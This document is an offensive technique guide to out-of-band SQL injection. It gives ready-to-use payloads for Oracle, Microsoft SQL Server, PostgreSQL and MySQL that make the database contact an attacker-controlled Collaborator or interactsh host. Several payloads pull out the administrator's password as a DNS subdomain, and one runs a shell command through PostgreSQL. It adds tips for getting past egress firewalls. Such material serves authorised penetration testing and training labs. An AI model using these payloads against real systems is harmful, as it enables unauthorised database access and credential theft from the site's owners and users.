# Out-of-Band SQL Injection (OAST)

## When this applies

- No in-band response (no boolean diff, no errors, no timing oracle).
- The database is asynchronous, or the query result is consumed elsewhere.
- The database server can make outbound DNS/HTTP requests.

## Technique

Force the database to make an outbound DNS or HTTP request to an attacker-controlled domain (Burp Collaborator, interactsh, or a self-hosted listener). Confirms injection asynchronously, and can carry exfiltrated data in the subdomain or path.

## Steps

### 1. Confirm OAST channel

**Oracle (XXE-style via `EXTRACTVALUE`):**
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
```

**Microsoft SQL Server:**
```sql
exec master..xp_dirtree '//COLLABORATOR/a'
```

**PostgreSQL:**
```sql
copy (SELECT '') to program 'nslookup COLLABORATOR'
```

**MySQL (Windows only — UNC path):**
```sql
LOAD_FILE('\\\\COLLABORATOR\\a')
SELECT ... INTO OUTFILE '\\\\COLLABORATOR\\a'
```

In Burp Repeater: right-click → "Insert Collaborator payload" to substitute the placeholder. Then "Poll now" in the Collaborator tab to see DNS/HTTP interactions.

### 2. Exfiltrate data via subdomain

Concatenate the data into the hostname so the DNS query carries the value:

**Oracle:**
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
```

DNS log on Collaborator: `<password>.<collaborator>.net`.

**Microsoft SQL Server:**
```sql
'; exec master..xp_dirtree '//'+( SELECT password FROM users WHERE username='administrator')+'.COLLABORATOR/a'--
```

**PostgreSQL:**
```sql
'; copy (SELECT password FROM users WHERE username='administrator') to program 'nslookup $(whoami).COLLABORATOR'--
```

### 3. Iterate when the value contains illegal hostname characters

DNS labels disallow `/`, spaces, etc. — hex-encode or hash before concatenating, then decode in Collaborator log:

```sql
||HEX((SELECT password FROM users WHERE username='administrator'))||
```

## Verifying success

- The Collaborator client shows a DNS or HTTP entry within seconds of sending the payload.
- The leaked subdomain decodes to the expected sensitive value.
- Repeating with a non-existent identifier produces no Collaborator hit (proves it's not background noise).

## Common pitfalls

- Oracle's `EXTRACTVALUE`/`xmltype` require XML parsing privileges that some Oracle XE editions disable.
- Egress firewalls may block DNS/HTTP out — try multiple ports, especially 53/UDP and 443/TCP.
- Burp Community lacks Collaborator; use interactsh (`interactsh-client -v`) or self-hosted DNS listener as alternative.
- `xp_dirtree` requires `xp_cmdshell` privilege equivalent on MSSQL; if denied, try `xp_fileexist`.
- MySQL OAST is Windows-only (UNC paths); Linux MySQL has no built-in OAST primitive.

## Tools

- Burp Suite Pro Collaborator client.
- Interactsh (`interactsh-client`).
- Self-hosted authoritative DNS for a wildcard domain.
- sqlmap with `--dns-domain=<your-domain>` (requires control of the authoritative DNS).
